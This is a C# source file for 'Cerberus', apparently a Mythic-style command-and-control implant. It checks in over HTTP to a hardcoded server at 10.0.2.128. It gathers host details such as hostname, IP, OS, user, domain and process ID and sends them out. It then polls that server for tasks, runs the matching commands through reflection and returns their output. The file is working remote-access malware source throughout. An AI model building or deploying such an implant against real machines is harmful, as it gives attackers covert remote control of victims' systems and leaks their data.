using Cerberus.Models.CommModule;
using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Threading;

namespace Cerberus
{
    class Program
    {
        private static CerberusMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _cancellationTokenSource;

        private static List<CerberusCommand> _commands = new List<CerberusCommand>();

        private static int SleepTime = 5000;
        private static CommunicationType _commType = CommunicationType.http;

        private static string serverAddress = "10.0.2.128";
        private static int serverPort = 80;
        private static string PayloadUUID = "5745c5fb-0a9f-47fa-a8d9-eab32fb43c35";
        private static string UUID = "";
        private string killdate = "";



        public enum CommunicationType
        {
            http,
            smb
        }

        static void Main(string[] args)
        {
            Thread.Sleep(5000);

            GenerateMetadata();
            LoadCerberusCommands();


            if (_commType == CommunicationType.http)
            {
                _commModule = new HttpCommModule(serverAddress, serverPort, SleepTime, _metadata, PayloadUUID);
                _commModule.Init(_metadata);
                _commModule.Start();

                _cancellationTokenSource = new CancellationTokenSource();

                UUID = _commModule.Metadata.uuid;

                while (!_cancellationTokenSource.IsCancellationRequested)
                {
                    if (_commModule.RecvData(out var tasks))
                    {
                        HandleTasks(tasks);
                    }
                }
            }
            else if (_commType == CommunicationType.smb)
            {
                throw new NotImplementedException();
            }
        }

            

        private static void HandleTasks(IEnumerable<MythicTask> tasks)
        {
            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(MythicTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.command, StringComparison.OrdinalIgnoreCase));

            if (command is null)
            {
                SendTaskResult(task, "Command not found.");
                return;
            }

            try
            {
                var result = command.Execute(task);
                SendTaskResult(task, result);
            }
            catch (Exception ex)
            {
                SendTaskResult(task, ex.Message);
            }
        }

        private static void SendTaskResult(MythicTask task, string result)
        {
/*            if (!task.completed)
            {
                return;
            }*/

            var taskResult = new MythicTaskResult
            {
                task_id = task.id,
                user_output = result,
                completed = true //task.completed,
            };

            _commModule.SendData(taskResult);
        }

        public void Stop()
        {
            _cancellationTokenSource.Cancel();
        }

        private static void LoadCerberusCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach(var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(CerberusCommand)))
                {
                    var instance = (CerberusCommand) Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }

        private static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            /*var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            _metadata = new CerberusMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };
*/
            

            string hostname = Environment.MachineName;
            IPHostEntry ipEntry = Dns.GetHostEntry(hostname);

            _metadata = new CerberusMetadata
            {
                action = "checkin",
                ip = ipEntry.AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = identity.Name,
                host = hostname,
                domain = Environment.UserDomainName,
                pid = process.Id,
                uuid = PayloadUUID,
                architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            identity.Dispose();
        }
    }
}
